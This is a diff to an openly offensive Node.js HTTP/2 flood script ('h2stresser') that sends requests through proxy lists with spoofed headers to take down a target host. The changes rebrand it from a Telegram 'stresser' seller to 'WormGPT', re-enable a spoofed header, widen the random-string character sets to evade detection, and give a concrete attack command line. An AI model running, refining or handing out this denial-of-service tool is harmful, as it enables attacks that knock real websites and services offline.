@@ -1,5 +1,3 @@
-//Method By STEVEN?STRESSER??
-//Jangan Dihapus Yang Hapus Saya Sumpah Jadi Yatim
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -192,7 +190,7 @@ const secureOptions =
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7) {
     // Use This Methods
-    console.log(`\x1b[36mUsage: node h2stresser.js host time req thread proxy.txt\x1b[0m`);
+    console.log(`\x1b[36mUsage: node hh2.js host 120 19 8 proxy.txt\x1b[0m`);
     process.exit();
 }
 
@@ -222,8 +220,8 @@ if (process.argv.length < 7) {
 const RESTART_DELAY = 1000;
 
  if (cluster.isMaster) {
-    console.log('Methods H2-STRESSER By t.me/@stevenstresser'.bgRed)
-    console.log(`---------------------Succesfully Attack By Steven-Stresser??-----------------------`.gray)
+    console.log('Methods H2-STRESSER By WormGPT'.bgRed)
+    console.log(`---------------------Succesfully Attack By WormGPT-----------------------`.gray)
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
@@ -454,7 +452,7 @@ const randstrsValue = randstrs(10);
     , 'gzip, identity'
   ];
   function randstrr(length) {
-		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
+		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥";
 		let result = "";
 		const charactersLength = characters.length;
 		for (let i = 0; i < length; i++) {
@@ -463,7 +461,7 @@ const randstrsValue = randstrs(10);
 		return result;
 	}
     function randstr(length) {
-		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥";
 		let result = "";
 		const charactersLength = characters.length;
 		for (let i = 0; i < length; i++) {
@@ -472,7 +470,7 @@ const randstrsValue = randstrs(10);
 		return result;
 	}
   function generateRandomString(minLength, maxLength) {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
@@ -493,7 +491,7 @@ const randstrsValue = randstrs(10);
         { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
         { "origin": "https://" + parsedTarget.host},
         { "source-ip": randstr(5)  },
-        //{"x-aspnet-version" : randstrsValue},
+        {"x-aspnet-version" : randstrsValue},
         { "data-return" :"false"},
         {"X-Forwarded-For" : parsedProxy[0]},
         {"NEL" : val},
@@ -634,4 +632,3 @@ setTimeout(StopScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
-
